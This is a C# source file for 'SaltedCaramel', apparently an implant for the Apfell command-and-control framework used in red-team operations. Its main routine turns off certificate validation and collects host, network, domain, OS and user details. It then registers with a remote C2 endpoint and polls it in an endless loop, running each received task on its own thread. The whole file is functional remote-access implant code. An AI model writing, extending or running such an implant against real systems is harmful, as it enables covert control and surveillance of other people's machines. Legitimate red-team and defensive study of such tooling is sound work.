using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SaltedCaramel
{
    class SaltedCaramel
    {
        static void Main(string[] args)
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SCImplant implant = new SCImplant()
            {
                uuid = args[2], // Generated when payload is created in Apfell
                endpoint = args[0] + "/api/v1.3/",
                host = Dns.GetHostName(),
                ip = Dns.GetHostEntry(Dns.GetHostName()) // Necessary because the host may have more than one interface
                    .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString(),
                domain = Environment.UserDomainName,
                os = Environment.OSVersion.VersionString,
                architecture = "x64",
                pid = Process.GetCurrentProcess().Id,
                sleep = 5000,
                user = Environment.UserName
            };
            HTTP.crypto.PSK = Convert.FromBase64String(args[1]);

            if (implant.InitializeImplant())
            {
                int shortId = 1;
                while (true)
                {
                    SCTask task = implant.CheckTasking();
                    if (task.command != "none")
                    {
                        task.shortId = shortId;
                        shortId++;

                        Thread t = new Thread(() => task.DispatchTask(implant));
                        t.Start();

                        Job j = new Job
                        {
                            shortId = task.shortId,
                            task = task.command,
                            thread = t
                        };

                        if (task.@params != "") j.task += " " + task.@params;

                        implant.jobs.Add(j);

                    }
                    Thread.Sleep(implant.sleep);
                }
            }
        }
    }
}
